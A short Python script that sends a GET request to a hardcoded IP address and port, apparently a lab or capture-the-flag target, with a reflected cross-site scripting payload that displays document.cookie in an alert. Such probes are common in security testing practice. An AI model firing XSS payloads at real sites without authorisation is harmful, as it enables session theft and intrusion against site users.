import requests

url = "http://161.35.173.232:30467"
params = {
	"task": "<script>alert(document.cookie)</script>"
}
r = requests.get(url, params=params)
print(r.url)